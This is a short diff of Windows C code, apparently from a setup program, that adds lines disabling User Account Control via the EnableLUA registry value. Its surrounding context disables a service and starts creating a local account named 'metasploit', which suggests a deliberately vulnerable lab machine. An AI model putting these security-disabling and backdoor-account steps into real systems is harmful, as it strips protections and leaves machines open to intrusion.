@@ -22,6 +22,14 @@ void start(){
 	RegSetValueExA(mkey,"Start",0,REG_DWORD,(PBYTE)&four,sizeof(DWORD));
 	RegCloseKey(mkey);
 
+	//Disable UAC
+	HKEY uackey;
+	DWORD zero = 0;
+	RegOpenKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+		0,KEY_SET_VALUE|KEY_WOW64_64KEY,&uackey);
+	RegSetValueExA(uackey,"EnableLUA",0,REG_DWORD,(PBYTE)&zero,sizeof(DWORD));
+	RegCloseKey(uackey);
+
 	//add user
 	USER_INFO_1 userinfo;
 	userinfo.usri1_name = L"metasploit";
